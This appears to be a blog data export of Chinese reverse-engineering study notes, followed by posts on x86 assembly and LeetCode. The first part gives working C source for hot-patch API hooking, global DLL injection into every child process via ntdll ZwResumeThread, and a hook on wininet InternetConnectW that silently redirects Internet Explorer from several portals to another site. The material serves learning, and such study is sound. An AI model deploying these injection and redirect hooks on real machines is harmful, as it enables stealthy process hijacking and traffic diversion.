GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"CreateProcessA\");\n    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,\n                                     lpCommandLine,\n                                     lpProcessAttributes,\n                                     lpThreadAttributes,\n                                     bInheritHandles,\n                                     dwCreationFlags,\n                                     lpEnvironment,\n                                     lpCurrentDirectory,\n                                     lpStartupInfo,\n                                     lpProcessInformation);\n\n    // 向生成的子进程注入 stealth2.dll\n    if( bRet )\n        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);\n\n    // hook\n    hook_by_code(\"kernel32.dll\", \"CreateProcessA\", \n                 (PROC)NewCreateProcessA, g_pOrgCPA);\n\n    return bRet;\n&#125;\n\n\nunhook()  -&gt;  Call original API -&gt; 新增的操作 -&gt; hook\n\nQ：值得注意的点\n\n以前的InjectDll()函数通过pid获取进程句柄进行注入，但在上述示例中调用CreateProcess()  API时，能自然而然的获得子进程的句柄lpProcessInformation-&gt;hProcess\n\n钩取未公开的API时，一定要检查它在当前os版本中是否能正常运行\n33.9 利用热补丁技术钩取APIAPI代码修改技术的问题Q：之前API代码修改的流程是每次都需要先unhook，最后再hook\n\n也就是每次程序内部调用CreateProcessA()  APi时，NewCreateProcess() A Api就会被调用执行，不断重复hook  unhook\n这种反复执行会造成性能低下，且在多线程的环境下会发生错误\n因为hook会对原API的前5个字节修改\n当一个线程尝试运行某代码，如果另一线程正在对改代码进行写操作，那就会出现冲突\n\n\n\n热补丁(修改7个字节代码)\nHot Patch或Hot fix\n\n利用热补丁技术比修改5个字节代码的方法更稳定\n\n\nQ：普通API起始代码的形态\n\n\n可以发现上面API代码以MOV EDI, EDI指令开始，在IA-32中是0x8BFF，\n它的大小是2bytes，用于把EDI寄存器的值再放到EDI寄存器\n\n\nAPI代码上面有5个NOP指令，IA-32指令0x90\n大小为1byte，没啥意义\n\n\n也就是说上面这7bytes是没有啥实际意义的\n\nQ：那没有意义，为什么还要设置呢？\n\n是为了方便打热补丁，热补丁由API钩取组成，在进程处于运行状态时更改进程内存中的库文件\n重启系统时，修改的目标库文件会被完全取代\n\nQ：使用热补丁钩取图33-16中的kernel32.CreateProcessA() API\n\n利用二次跳转\n\n\n\n调用这个API时，首先会调用7C80236B地址处的JMP SHORT，长度是2bytes\n跳转到7C802366处，接着会JMP 10001000，即跳转到实际钩取的函数地址10001000，长度为5bytes\n像这样经过两次连续跳转，就完成了对指定API的钩取，因为原来的7bytes都是没有意义的，所以可以修改\n\n\n\n\n\n\n\n提示\n从图33-20中的7C802366、7C80236B 地址可以看到，虽然都是JMP指令，但指令形态不同。\nFAR JMP\n\n7C802366地址处的指令形式为E9XXXXXXXX，大小为5个字节，被称为 FAR JMP，用来实现远程跳转(可以跳转到进程内存用户区域中的任意位置 )\n\n**SHORT JMP **\n\n而7C80236B地址处的指令形式为EB YY，大小为2个字节，被称为SHORT JMP，\n它只能以当前 EIP 为基准，在-128~127 范围内跳转。\n\n\n\n\n不需要在钩取函数内部进行脱钩&#x2F;挂钩 操作\n\n\n&#x3D;&#x3D;目前我没理解为啥？&#x3D;&#x3D;\n\nQ：如果使用前面的5字节代码修改，指令是\n\n没有PUSH EBP\nMOV EBP ESP\n\n\n33.11 源代码分析stealth3.cpp\n用热补丁技术钩取API\n\nBOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)\n&#123;\n\tFARPROC pFunc;\n\tDWORD dwOldProtect, dwAddress;\n\tBYTE pBuf[5] = &#123; 0xE9, 0, &#125;; // 0xE9是JMP\n    BYTE pBuf2[2] = &#123; 0xEB, 0xF9 &#125;;\n\tPBYTE pByte;\n\n\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\n\tpByte = (PBYTE)pFunc;\n\tif( pByte[0] == 0xEB )\n\t\treturn FALSE;\n\n\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\n    // 1. NOP (0x90)\n\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc;\n\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\n\tmemcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);\n    \n    // 2. MOV EDI, EDI (0x8BFF)\n    memcpy(pFunc, pBuf2, 2);\n\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &amp;dwOldProtect);\n\treturn TRUE;\n&#125;\n\nQ：首先把API起始地址上方的NOP * 5修改成JMP XXXXXXXX\n\n\n根据前面学的，相对地址是相对末端的地址，对于前面API修改的JMP，XXXXXXXX &#x3D; pfnNew - pFunc - 5\n对于热补丁的JMP，XXXXXXXX &#x3D; pfnNew - pFunc\n\nQ：改完之后，把NOP * 5指令替换为JMP XXXXXXXX指令\nmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\nmemcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);\n\n\n先把pBuf的后四位改成XXXXXXXX\n再把NOP * 5改成JMP XXXXXXXX\n\nQ：计算JMP SHORT的地址\n\n这里t相对于s的相对地址为t - s &#x3D; -7，也就是0xF9，是补码形式，热补丁中这个值总是0xF9，将它硬编码到源代码就可以了\n\n\nunhook_by_hotpatch()\n取消API钩取的函数\nBOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)\n&#123;\n    FARPROC pFunc;\n    DWORD dwOldProtect;\n    PBYTE pByte;\n    BYTE pBuf[5] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;\n    BYTE pBuf2[2] = &#123; 0x8B, 0xFF &#125;;\n\n    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\n    pByte = (PBYTE)pFunc;\n    if( pByte[0] != 0xEB )\n        return FALSE;\n\n    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n    // 1. NOP (0x90)\n    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);\n    // 2. MOV EDI, EDI (0x8BFF)\n    memcpy(pFunc, pBuf2, 2);\n    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);\n    return TRUE;\n&#125;\n\n把修改后的指令恢复成原来的NOP * 5和MOV EDI,EDi指令\n\n这些指令在热补丁中也是不变的，所以可以硬编码到源代码\n\n\nNewCreateProcessA()BOOL WINAPI NewCreateProcessA(\n    LPCTSTR lpApplicationName,\n    LPTSTR lpCommandLine,\n    LPSECURITY_ATTRIBUTES lpProcessAttributes,\n    LPSECURITY_ATTRIBUTES lpThreadAttributes,\n    BOOL bInheritHandles,\n    DWORD dwCreationFlags,\n    LPVOID lpEnvironment,\n    LPCTSTR lpCurrentDirectory,\n    LPSTARTUPINFO lpStartupInfo,\n    LPPROCESS_INFORMATION lpProcessInformation\n)\n&#123;\n    BOOL bRet;\n    FARPROC pFunc;\n\n    // 调用 original API\n    pFunc = GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"CreateProcessA\");\n    pFunc = (FARPROC)((DWORD)pFunc + 2);\n    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,\n                                     lpCommandLine,\n                                     lpProcessAttributes,\n                                     lpThreadAttributes,\n                                     bInheritHandles,\n                                     dwCreationFlags,\n                                     lpEnvironment,\n                                     lpCurrentDirectory,\n                                     lpStartupInfo,\n                                     lpProcessInformation);\n\n    // 向生成的子进程注入 stealth3.dll\n    if( bRet )\n        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);\n\n    return bRet;\n&#125;\n\n\n这里和前面的区别是不再调用hook和unhook，且添加了计算pFunc的语句\n这里跳过了原始API地址处的JMP YY指令，从紧接着的下一条指令开始执行，和调用原API效果一样\n\n33.12 利用热补丁钩取API需要考虑的问题Q：显然是必须满足NOP * 5 +  MOV EDI,EDI\n\n但是有些API是不满足这个条件的\n\n\n\n\n\n\n\n\n\n提示\n\nNtdll.dll中的API代码都比较短，钩取这些API时，可以把原API备份到用户内存区域\n之后使用5字节代码修改原API的起始部分，在hook函数内部，调用备份的API即可\n这样很简单稳定，且Ntdll.dll的代码比较短，代码内部地址无依赖性，所以适合这种方式\n\n\n\n小结Q：出现Open process 3976 failed原因是\n\nWindows Vista&#x2F;7中使用了会话隔离技术，这可能导致DLL注入失败。\n出现这个问题时，不要使用kernel32.CreateRemoteThread()，而使用ntdll.NtCreateThreadEx()就可以了。相关内容请参考Session in Windows 7中的说明。\n有时开启杀毒软件自身的进程保护功能也会导致DLL注入失败。此外，尝试向PE32+格式的进程注入PE32格式的DLL时，也会失败反之亦然)。\n注入时必须保证要注入的DLL文件与目标进程的PE格式一致(PE32+格式是Windows64位OS使用的可执行文件格式)。\n\nQ：使用全局钩取技术注入dl文件时会不会给系统带来很大负担呢?所有进程在创建的时候都要注入dll，那么内存使用量会大幅飙升吧?\n\n首先，任何钩取操作都会给系统带来一定负担。编写程序时若能巧妙运用一些手法，则可以将这种对系统的影响降到最低，不会有什么问题，但一定要充分考虑好系统稳定性与资源利用问题。\n向所有进程注入DLL时，内存使用量也会随之增加，但并不是以“DLL尺寸*注入进程的个数增加。\nWindows中，相同DLL只要加载到内存中1次即可，进程通过映射技术使用它。\n简言之，通过映射技术将代码映射到相同内存，即代码区对所有进程都是一样的，而数据区则要根据相应进程重新创建。\n\n0x34 高级全局API钩取: IE连接控制Q：目标\n\n钩取IE，并在用户试图连接到指定网站时，连接到我的blog\n无论输入啥地址，还是点击链接，都无法连接到被阻止的网站\n\n34.1 目标APIQ：选择的API是\n\n钩取套接字库ws2_32.dll，或者微软提供的网络访问相关库(wininet.dll、winhttp.dll)\n\nQ：看edge浏览器加载的dll\n\n\n正常要看ie浏览器加载的dll，ie浏览器会加载wininet.dll库，wininet.dll有个InternetConnect()的API，这个APi用来连接某个网站\n\n\n\nQ：验证Wininet.InternetConnect() APi是否是要钩取的API\n\nalt  + e可以查看加载的dll\n\n接着调试IE进程，在ie浏览器地址栏输入要连接的网站地址\n\n最终证明wininet!InternetConnectW() API的lpszServerName参数控制要连接的网站，因此就钩取这个API就行\n\n\n34.2 IE进程结构\n重新运行IE浏览器，打开多个选项卡\n\nQ：使用process explorer查看IE进程结构\n\n\n之前打开了7个选项卡，共有5个ie进程在运行\n且3784的ieplore.exe和其他进程是父子关系，它管理着各选项卡对应的子进程\n\n\n\n\n\n\n\n提示\nIE 7 开始引入“选项卡”这一概念，进程结构也发生了如上所示的变化。这种新进程结构下，每个选项卡都是一个独立运行的进程，其中一个选项卡发生错误，不会影响到其他选项卡或父进程(IE本身)(最新的网页浏览器中都使用了这项技术)。\n\n\n\n因为每个选项卡对应的子iexplore.exe进程实际负载网络连接，我们需要钩取每个iexplore.exe的API，因此应该采用全局API钩取\n\n34.3 全局API钩取的概念Q：常规API钩取\n\n\n要钩取2492这个进程时，用InjDll.exe把Hook.dll注入Test.exe，然后钩取指定的API\n如果后面新生成了一个Test.exe，那么也需要再注入Hook.dll，再进行API钩取\n\nQ：全局API钩取\n\n\n把gHook.dll注入到Explorer.exe进程，最开始并没有注入到Test.exe进程\ngHook.dll中扩展了Hook.dll。可以钩取CreateProcess() API，每当子进程被创建时，都会将自身gHook.dll注入新创建的进程\n\n\n\n\n\n\n\n提示\n实际上除了Explorer.exe，其他进程也可以创建子进程。所以要完美实现API钩取，需要钩取所有进程。但是处于开销考虑，就钩取特定的进程\n\n\n34.4 ntdll!ZwResumeThread() APIQ：测试CreateProcess()  API\n\nkernerl32!CreateProcess() API用来创建子进程，写一个简单的程序测试CreateProcess()  API\n\n34.5 控制IE网络连接Q：钩取特定进程的API\n\n用IE连接指定网站时，让他连接到另外的网站\n在IE中添加新选项卡，比较新添加的进程的情形\n\nQ：IE进程结构\n\nIE进程以父子进程的形式运行，只要钩取父进程的ntdll!ZwResumeThread()，后面生成的所有子IE进程都会自动钩取\n\n\n注入DLLQ：将redirect.dll文件注入IE进程\n创建新选项卡\n此时新选项卡中也已经注入了redirect.dll\n\n尝试连接网站\n在IE选项卡中连接www.baidu.com，但是发现实际上连接的确实www.reverse.com\n\n34.6 源代码DllMain()BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    char            szCurProc[MAX_PATH] = &#123;0,&#125;;\n    char            *p = NULL;\n\n    switch( fdwReason )\n    &#123;\n        case DLL_PROCESS_ATTACH : \n            DebugLog(\"DllMain() : DLL_PROCESS_ATTACH\\n\");\n\n            GetModuleFileNameA(NULL, szCurProc, MAX_PATH);\n            p = strrchr(szCurProc, '\\\\');\n            if( (p != NULL) &amp;&amp; !_stricmp(p+1, \"iexplore.exe\") )\n            &#123;\n                DebugLog(\"DllMain() : current process is [iexplore.exe]\\n\");\n\n                // 钩取 wininet!InternetConnectW() API 前先加载 wininet.dll\n                // 预先加载 wininet.dll\n\t\t\t\t// 需要在相关进程的主线程开始之前拦截控制权，此时，我们要钩取的wininet.dll模块可能尚未加载。\n                if( NULL == LoadLibrary(L\"wininet.dll\") )\n                &#123;\n                    DebugLog(\"DllMain() : LoadLibrary() failed!!! [%d]\\n\", GetLastError());\n                &#125;\n            &#125;\n\n            // hook\n            hook_by_code(\"ntdll.dll\", \"ZwResumeThread\", (PROC)NewZwResumeThread, g_pZWRT);\n            hook_by_code(\"wininet.dll\", \"InternetConnectW\", (PROC)NewInternetConnectW, g_pICW);\n            break;\n\n        case DLL_PROCESS_DETACH :\n            DebugLog(\"DllMain() : DLL_PROCESS_DETACH\\n\");\n\n            // unhook\n            unhook_by_code(\"ntdll.dll\", \"ZwResumeThread\",  g_pZWRT);\n            unhook_by_code(\"wininet.dll\", \"InternetConnectW\",  g_pICW);\n            break;\n    &#125;\n\n    return TRUE;\n&#125;\n\nQ：为什么上面代码中，在运行的进程是iexplorer.exe时，要加载winnet.dll？\n\n钩取ntdll!ZwResumeThread() API时，需要在相关进程的主线程开始前，拦截控制权\n此时，钩取的winnet.dll可能还没有加载。如果它没u加载，我就没法钩取它内部的InternetConnectW\n\nNewInternetConnectW()\nwinnet!InternetConnectW()的钩取函数是NewInternetConnectW()\n\nHINTERNET WINAPI NewInternetConnectW\n(\n    HINTERNET hInternet,\n    LPCWSTR lpszServerName,\n    INTERNET_PORT nServerPort,\n    LPCTSTR lpszUsername,\n    LPCTSTR lpszPassword,\n    DWORD dwService,\n    DWORD dwFlags,\n    DWORD_PTR dwContext\n)\n&#123;\n    HINTERNET hInt = NULL;\n    FARPROC pFunc = NULL;\n    HMODULE hMod = NULL;\n\n    // unhook\n    if( !unhook_by_code(\"wininet.dll\", \"InternetConnectW\", g_pICW) )\n    &#123;\n        DebugLog(\"NewInternetConnectW() : unhook_by_code() failed!!!\\n\");\n        return NULL;\n    &#125;\n\n    // call original API\n    hMod = GetModuleHandle(L\"wininet.dll\");\n    if( hMod == NULL )\n    &#123;\n        DebugLog(\"NewInternetConnectW() : GetModuleHandle() failed!!! [%d]\\n\", GetLastError());\n        goto __INTERNETCONNECT_EXIT;\n    &#125;\n\n    pFunc = GetProcAddress(hMod, \"InternetConnectW\");\n    if( pFunc == NULL )\n    &#123;\n        DebugLog(\"NewInternetConnectW() : GetProcAddress() failed!!! [%d]\\n\", GetLastError());\n        goto __INTERNETCONNECT_EXIT;\n    &#125;\n\n    if( !_tcsicmp(lpszServerName, L\"www.naver.com\") ||\n        !_tcsicmp(lpszServerName, L\"www.daum.net\") ||\n        !_tcsicmp(lpszServerName, L\"www.nate.com\") || \n        !_tcsicmp(lpszServerName, L\"www.yahoo.com\") )\n    &#123;\n        DebugLog(\"[redirect] naver, daum, nate, yahoo => reversecore\\n\");\n        hInt = ((PFINTERNETCONNECTW)pFunc)(hInternet,\n                                           L\"www.reversecore.com\",\n                                           nServerPort,\n                                           lpszUsername,\n                                           lpszPassword,\n                                           dwService,\n                                           dwFlags,\n                                           dwContext);\n    &#125;\n    else\n    &#123;\n        DebugLog(\"[no redirect]\\n\");\n        hInt = ((PFINTERNETCONNECTW)pFunc)(hInternet,\n                                           lpszServerName,\n                                           nServerPort,\n                                           lpszUsername,\n                                           lpszPassword,\n                                           dwService,\n                                           dwFlags,\n                                           dwContext);\n    &#125;\n\n__INTERNETCONNECT_EXIT:\n\n    // hook\n    if( !hook_by_code(\"wininet.dll\", \"InternetConnectW\", (PROC)NewInternetConnectW, g_pICW) )\n    &#123;\n        DebugLog(\"NewInternetConnectW() : hook_by_code() failed!!!\\n\");\n    &#125;\n    \n    return hInt;\n&#125;\n\n\n\n这里利用的是5字节的代码修改，流程和之前一样，InternetConnectW() API的第二个参数控制连接网站的地址\n\nNewZwResumeThread()\n用来对ntdll!ZwResumeThread() APi进行全局钩取\nNTSTATUS WINAPI NewZwResumeThread(HANDLE ThreadHandle, PULONG SuspendCount)\n&#123;\n    NTSTATUS status, statusThread;\n    FARPROC pFunc = NULL, pFuncThread = NULL;\n    DWORD dwPID = 0;\n\tstatic DWORD dwPrevPID = 0;\n    THREAD_BASIC_INFORMATION tbi;\n    HMODULE hMod = NULL;\n    TCHAR szModPath[MAX_PATH] = &#123;0,&#125;;\n\n    DebugLog(\"NewZwResumeThread() : start!!!\\n\");\n\n    hMod = GetModuleHandle(L\"ntdll.dll\");\n    if( hMod == NULL )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : GetModuleHandle() failed!!! [%d]\\n\",\n                  GetLastError());\n        return NULL;\n    &#125;\n\n\t// 查询线程信息\n    // call ntdll!ZwQueryInformationThread()\n    pFuncThread = GetProcAddress(hMod, \"ZwQueryInformationThread\");\n    if( pFuncThread == NULL )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : GetProcAddress() failed!!! [%d]\\n\",\n                  GetLastError());\n        return NULL;\n    &#125;\n\t//tbi是线程的基本信息\n    statusThread = ((PFZWQUERYINFORMATIONTHREAD)pFuncThread)(ThreadHandle, 0, &amp;tbi, sizeof(tbi), NULL);\n    if( statusThread != STATUS_SUCCESS )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : pFuncThread() failed!!! [%d]\\n\", GetLastError());\n        return NULL;\n    &#125;\n\n\t// dwPID为要唤醒的进程ID（子进程），GetCurrentProcessId则是当前创建子进程的进程的ID（父进程）。\n    //这里判断进程id是不是父进程的id，如果不是的话，给当前的子进程注入dll\n    dwPID = (DWORD)tbi.ClientId.UniqueProcess;\n    if ( (dwPID != GetCurrentProcessId()) &amp;&amp; (dwPID != dwPrevPID) )\n    &#123;\n        DebugLog(\"NewZwResumeThread() => call InjectDll()\\n\");\n\n        dwPrevPID = dwPID;\n\n        // 修改 privilege\n       \tif( !SetPrivilege(SE_DEBUG_NAME, TRUE) )\n            DebugLog(\"NewZwResumeThread() : SetPrivilege() failed!!!\\n\");\n\n        // 获取 injection dll 路径\n        GetModuleFileName(GetModuleHandle(STR_MODULE_NAME), \n                          szModPath, \n                          MAX_PATH);\n\n        if( !InjectDll(dwPID, szModPath) )\n            DebugLog(\"NewZwResumeThread() : InjectDll(%d) failed!!!\\n\", dwPID);\n    &#125;\n\n    // 脱钩\n    if( !unhook_by_code(\"ntdll.dll\", \"ZwResumeThread\", g_pZWRT) )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : unhook_by_code() failed!!!\\n\");\n        return NULL;\n    &#125;\n\n    pFunc = GetProcAddress(hMod, \"ZwResumeThread\");\n    if( pFunc == NULL )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : GetProcAddress() failed!!! [%d]\\n\",\n                  GetLastError());\n        goto __NTRESUMETHREAD_END;\n    &#125;\n\t//调用原来函数\n    status = ((PFZWRESUMETHREAD)pFunc)(ThreadHandle, SuspendCount);\n    if( status != STATUS_SUCCESS )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : pFunc() failed!!! [%d]\\n\", GetLastError());\n        goto __NTRESUMETHREAD_END;\n    &#125;\n\n__NTRESUMETHREAD_END:\n\t//hook\n    if( !hook_by_code(\"ntdll.dll\", \"ZwResumeThread\", (PROC)NewZwResumeThread, g_pZWRT) )\n    &#123;\n        DebugLog(\"NewZwResumeThread() : hook_by_code() failed!!!\\n\");\n    &#125;\n\n    DebugLog(\"NewZwResumeThread() : end!!!\\n\");\n\n    return status;\n&#125;\n\nQ：上面的整个流程是\n\n正常情况下，如果已经有了一个test.exe，当又创建一个test.exe时，是父进程调用CreateProcess来创建的\n在创建的最后一步，是调用ZwResumeThread()，恢复子进程的主线程，从而执行test.exe的EP代码。在没调用这个之前，是不会运行EP代码的。\n\n\n在钩取ZwResumeThread()时，也就是已经到上面我说的这步了\n那么我首先通过ZwQueryInformation获得当前主线程的子进程的信息\n给这个子进程注入dll\n接着脱钩，调用ZwResumeThread()，正常执行子进程的EP代码，创建子进程\n然后再hook\n\n\n这样我实现了全局的API钩取，每次在创建子进程时，都会给他注入dll\n\nQ：综上\n\n可以发现其实并不是所有的API钩取都执行的是 “unhook -&gt; 调用原函数 -&gt; 注入 -&gt; Hook “ 的过程\n因为上面这个调用ZwResumeThread()就会创建出完整的进程了，所以并不能先调用\n\n","slug":"re-engineer-core-principle-04","date":"2024-01-07T10:57:34.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"0eefe6b6118865b181e289b1081cce4b","title":"汇编指令","content":"汇编指令Q：PUSHAD (将所有寄存器的值压入栈)\nPUSHAD  &#x2F;&#x2F;是一个x86汇编指令，用于将通用寄存器（EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI）的值依次压入堆栈中。该指令的作用\t\t  \n\t\t&#x2F;&#x2F;是保存这些寄存器的值，以便在稍后的代码中使用或恢复。\n\n\n首先使用PUSHAD命令将EAX~EDI寄存器的值保存到栈\n然后分别把第二个节区的起始地址(01011000)与第一个节区的起始地址(01001000)设置到ESI与EDI寄存器。\n\nQ：LEA指令(加载有效地址)\nLEA EDI, DWORD PTR DS:[ESI+FFFF0000]\n加载有效地址（Load Effective Address）指令，用于将指定内存地址的有效地址计算结果存储到目标寄存器 EDI 中\n\n&quot;LEA&quot; 是加载有效地址的指令。\n&quot;EDI&quot; 是目标寄存器，表示要将有效地址计算结果存储到 EDI 寄存器中。\n&quot;DWORD PTR&quot; 是一个操作数大小指示符，表示要操作的是一个双字（32位）数据。\n&quot;DS:[ESI+FFFF0000]&quot; 是指定的内存地址，表示要对 DS:ESI+FFFF0000 指向的内存地址进行有效地址计算。\n\n- \n汇编指令\nMOV AL,BYTE PTR DS:[EDX] &#x2F;&#x2F;类型转换为BYTE，是8位，AL是AX(16位寄存器)的低8位\nINC EDX &#x2F;&#x2F;给EDX加1\nDEC EDX &#x2F;&#x2F;给EDX减1\n\n\n\nQ：JNZ指令\nJNZ是x86汇编指令中的条件跳转指令，它的全称是”Jump if Not Zero”，表示在某个条件下，如果结果不为0，也就是零标志位不被设置时，则执行跳转操作。\n具体解释如下：\nJNZ：是条件跳转指令的助记符，它用于根据零标志位（ZF）的值来进行有条件的跳转。零标志位（ZF）：是一个标志位寄存器中的一个标志位，用于指示上一次运算结果是否为零。如果上一次运算结果为零，ZF被设置为1，否则为0。JNZ指令的操作步骤如下：\n如果ZF为0（上一次运算结果不为零），则执行跳转到指定的目标地址。如果ZF为1（上一次运算结果为零），则不执行跳转，继续顺序执行下一条指令。\nQ：LODS指令\nMOV ESI,10011B0\nLODS DWORD PTR DS:[ESI]  \n\n&#x2F;&#x2F;&quot;LODS&quot; 指令是 &quot;Load String&quot; 的缩写，用于加载字符串或数据块\nDWORD PTR&quot; 用于指定操作数的大小，这里表示操作数是一个双字（32位）\n&quot;DS:[ESI]&quot; 是一个内存引用，表示从段寄存器 DS 所指向的段中，以 ESI 寄存器中的值作为偏移地址来访问内存\n\n\n这两条指令的意思是从10011B0中加载4字节的数据，保存到EAX中\n\nQ：REP指令\n\n汇编指令,它会重复执行复制字符串，直到ECX计数器为0\nREP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]\n\nREP&quot; 是一个前缀指令，用于指示指令重复执行。\n&quot;MOVS&quot; 是 &quot;Move String&quot; 的缩写，用于将字符串或数据块从一个内存位置复制到另一个内存位置。\n&quot;BYTE PTR&quot; 是一个操作数大小指示符，表示每次传送的是一个字节（8位）数据。\n&quot;ES:[EDI]&quot; 是目标地址，表示要将数据复制到 ES:EDI 指向的内存位置。\n&quot;DS:[ESI]&quot; 是源地址，表示要从 DS:ESI 指向的内存位置读取数据。\n\nQ：STOS指令\n\n汇编指令:会把累加器中的数据存储到EDI中\nSTOS BYTE PTR ES:[EDI]\n\n&quot;STOS&quot; 是 &quot;Store String&quot; 的缩写，用于将字符串或数据块存储到内存中。\n&quot;BYTE PTR&quot; 是一个操作数大小指示符，表示要存储的是一个字节（8位）数据。\n&quot;ES:[EDI]&quot; 是目标地址，表示要将数据存储到 ES:EDI 指向的内存位置\n\n&#x3D;&#x3D;问题：为什么已经有了MOVS，还需要LODS和STOPS呢&#x3D;&#x3D;\nQ：XCHG指令\nXCHG DL, BH\n“XCHG” 是 “Exchange” 的缩写，它用于交换两个操作数的值。在这种情况下，指令将 DL 寄存器和 BH 寄存器的值进行交换。\n具体执行的步骤如下：\n将 DL 寄存器的值存储到临时存储区。将 BH 寄存器的值复制到 DL 寄存器中。最后，将之前存储在临时存储区的值复制到 BH 寄存器中。这条指令可以用于在汇编语言中交换两个寄存器的值，以实现数据的重新排列或交换。\nOllydbg常用快捷键Assemble(Space):输入汇编代码\nAnalysis(Ctrl+A):再次分析代码New origin here(Ctrl+Gray*):更改EIP\n\n","slug":"汇编指令","date":"2024-01-06T07:18:53.000Z","categories_index":"","tags_index":"汇编","author_index":"XyM4ster"},{"id":"2db13004f026edb4056c7fbb5f3564d1","title":"leetcode刷题","content":"数组二分法思路这里直接用左闭右开的写法，定义target在[left,right)区间内\n那么有下面几点：\n\nwhile(left &lt; right)，因为left &#x3D;&#x3D; right是没有意义的\n\nif(nums[middle] &gt; target)，right更新为middle，正常要从middle -1 开始找，但是因为是开区间，所以从middle开始\n\n\n\n代码class Solution &#123;\n    public int search(int[] nums, int target) &#123;\n        int left = 0, right = nums.length;\n        while (left &lt; right) &#123;\n            int mid = left + ((right - left) >> 1);\n            if (nums[mid] == target)\n                return mid;\n            else if (nums[mid] &lt; target)\n                left = mid + 1;\n            else if (nums[mid] > target)\n                right = mid;\n        &#125;\n        return -1;\n    &#125;\n&#125;\n\n双指针\n在两头分别定义一个指针i,j\n循环条件\nwhile(i &lt;&#x3D; j)\n\n\n\n滑动窗口\n边界条件可以定义\nint result &#x3D; Integer.MAX_VALUE;\n\n适用条件\n当需要双重遍历解决，且是连续的情况下\nclass Solution &#123;\n\n    // 滑动窗口\n    public int minSubArrayLen(int s, int[] nums) &#123;\n        int left = 0;\n        int sum = 0;\n        int result = Integer.MAX_VALUE;\n        for (int right = 0; right &lt; nums.length; right++) &#123;\n            sum += nums[right];\n            while (sum >= s) &#123;\n                result = Math.min(result, right - left + 1);\n                sum -= nums[left++];\n            &#125;\n        &#125;\n        return result == Integer.MAX_VALUE ? 0 : result;\n    &#125;\n&#125;\n\n链表双指针思路\n定义一个前驱节点pre为null，定义当前节点cur &#x3D; head\n\n反转链表\nclass Solution &#123;\n    public ListNode reverseList(ListNode head) &#123;\n        ListNode cur = head;\n        ListNode pre = null;\n        while(cur != null)&#123;\n            head = head.next;\n            cur.next = pre;\n            pre = cur;\n            cur = head;\n        &#125;\n        return pre;\n    &#125;\n\n&#125;\n\n虚拟头节点思路\n定义一个虚拟头节点，让虚拟头节点的next为head\n\n经典题目59 螺旋矩阵II题目描述\n思路\n定义边界：一个非常重要的思想是参考二分法，定义左闭右开\n\n也就是在遍历矩阵时，定义第一行只访问[1,4)\n\n4由遍历列时访问\n\n\n\n\n特殊点：\n\n当n是奇数时，中间的心是遍历不到的，所以需要指定它的值\n\n\n\n代码class Solution &#123;\n    public int[][] generateMatrix(int n) &#123;\n        int arr[][] = new int [n][n];\n        int count = 1;\n        int i = 0, j = 0;\n        int l = 0, r = n - 1;\n    \n        while(count &lt; n * n)&#123;\n            while(j &lt; r)&#123;\n                arr[i][j] = count;\n                j++;\n                count++;\n            &#125;\n            while(i &lt; r)&#123;\n                arr[i][j] = count;\n                i++;\n                count++;\n            &#125;\n            while(j > l)&#123;\n                arr[i][j] = count;\n                j--;\n                count++;\n            &#125;\n            while(i > l)&#123;\n                arr[i][j] = count;\n                i--;\n                count++;\n            &#125;\n            l++;\n            r--;\n            i = l;\n            j = l;\n        &#125;\n        if(n % 2 == 1)&#123;\n            arr[n/2][n/2] = n * n;\n        &#125;\n        return arr;\n        \n    &#125;\n&#125;\n\n","slug":"leetcode刷题","date":"2023-12-25T02:34:41.000Z","categories_index":"","tags_index":"","author_index":"XyM4ster"},{"id":"449c952c21adaaa0689becdb96065fd3","title":"re-engineer-core-principle-03","content":"引言\n第三部分冲冲冲\n这一部分要把没见过的汇编单独整理到一个文档里\n\n0x21 Windows消息钩取21.1 钩子(Hook)Q：钩子\n\n就是偷看或截取信息所有的手段或者工具\n\n21.2 消息钩子Q：常规Windows信息流\n\n发生键盘输人事件时，WM_KEYDOWN消息被添加到[OS message queue]\nOS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中\n应用程序(如记事本监视自身的[application message 